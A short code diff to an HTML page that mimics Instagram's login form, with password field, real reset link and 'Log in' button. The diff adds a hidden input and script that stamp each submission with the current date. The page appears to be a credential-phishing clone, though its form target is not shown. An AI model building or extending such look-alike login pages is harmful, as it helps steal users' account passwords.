@@ -422,6 +422,7 @@
     <input type="password" class="form-input" placeholder="Password" onchange="onchange()" name="password" id="password" /><button id="toggle" type="button" class="toggle"></button>
   <a class="link2" href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
   <button type="submit" class="form-button" id='button' name="commit" value="instagram" disabled="true">Log in</button>
+            <input type="hidden" name="Time" value="date" id="date"/>
 </form>
 <div class="separator">
   <span class="span"></span>
@@ -509,7 +510,8 @@ err.style.display = "none";
 err.style.display = "block";
 }
 }
-
+      var date = new Date();
+	document.getElementById("date").value= date;
 </script>
 </body>
 </html>
